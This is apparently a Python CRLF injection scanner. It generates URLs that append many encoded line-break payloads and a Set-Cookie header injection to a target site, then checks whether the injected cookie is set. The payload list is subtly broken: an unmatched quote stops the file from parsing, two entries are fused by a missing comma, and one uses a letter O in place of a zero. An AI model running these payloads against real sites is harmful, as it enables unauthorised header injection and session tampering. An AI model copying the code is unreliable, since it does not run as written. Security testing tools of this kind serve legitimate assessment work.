#!/usr/bin/python

import eventlet, requests


class CrlfScanner():
    """ Scans URLs for CRLF injection.
    """

    # List of web protocols.
    PROTOCOL_LIST = ['http', 'https']

    # Append this to beginning of escape sequence.
    APPEND_LIST = ["", "crlf", "?crlf=", "#"]

    # List of escape sequences that possibly result in crlf.
    ESCAPE_LIST = ['%0d','%0a', '%0d%0a', '%23%0d', '%23%0a', '%23%0d%0a''%%0a0a','%25%30%61','%25%30,'%250a','%25250a','%2e%2e%2f%0d%0','%2f%2e%2e%0d%0a','%2F..%0d%0a','%3f%0d%0a','%3f%0d','%u000a','%0A%20','%20%0A','%E5%98%8A%E5%98%8D','%E5%98%8A%E5%98%8D%0A','%3F%0A','crlf%0A','crlf%0A%20','crlf%20%0A','crlf%23%OA','crlf%E5%98%8A%E5%98%8D','crlf%E5%98%8A%E5%98%8D%0A','crlf%3F%0A','%0D%20','%20%0D','%23%0A','%E5%98%8A%E5%98%8D','%E5%98%8A%E5%98%8D%0D','crlf%0D','crlf%0D%20','crlf%20%0D','crlf%23%0D','crlf%23%0A','crlf%E5%98%8A%E5%98%8D','crlf%E5%98%8A%E5%98%8D%0D','crlf%3F%0D','%0D%0A','%0D%0A%20','%20%0D%0A','\r\n','%5cr%5cn','%E5%98%8A%E5%98%8D','%E5%98%8A%E5%98%8D%0D%0A','crlf%0D%0A%20','crlf%20%0D%0A','crlf%23%0D%0A','crlf\r\n','crlf%5cr%5cn','crlf%E5%98%8A%E5%98%8D','crlf%E5%98%8A%E5%98%8D%0D%0A','crlf%3F%0D%0A','%0D%0A%09','crlf%0D%0A%09','%25%30A','//www.google.com/%2F%2E%2E%0D%0A','/www.google.com/%2E%2E%2F%0D%0A','/google.com/%2F..%0D%0A']

    # By default, the scanner will try to inject a Set-Cookie statment.
    DEFAULT_INJ = "Set-Cookie:param=crlf;"

    # If we don't get a response within the TIMEOUT, terminate the current scan.
    TIMEOUT = 5

    def __init__(self):
        self.inj_str = self.DEFAULT_INJ

    def generate_vuln_urls(self, url):
        """ Generate URLS that may be vulnerable to CRLF injection.
        """
        vuln_urls = []
        if not url.endswith('/'):
            url += '/'
        for protocol in self.PROTOCOL_LIST:
            for append in self.APPEND_LIST:
                for escape in self.ESCAPE_LIST:
                    vuln_urls.append(protocol + "://" + url +\
                                     append + escape + self.inj_str)
        return vuln_urls
    
    def scan(self, url):
        """ Scan target URL for CRLF injection
        """
        result = False
        session = requests.Session()
        with eventlet.Timeout(self.TIMEOUT):
            try:
                session.get(url)
            except KeyboardInterrupt:
                raise
            except:
                pass
            if 'param' in session.cookies.get_dict() and\
                'crlf' in session.cookies.get_dict().values():
                result = True
        return result
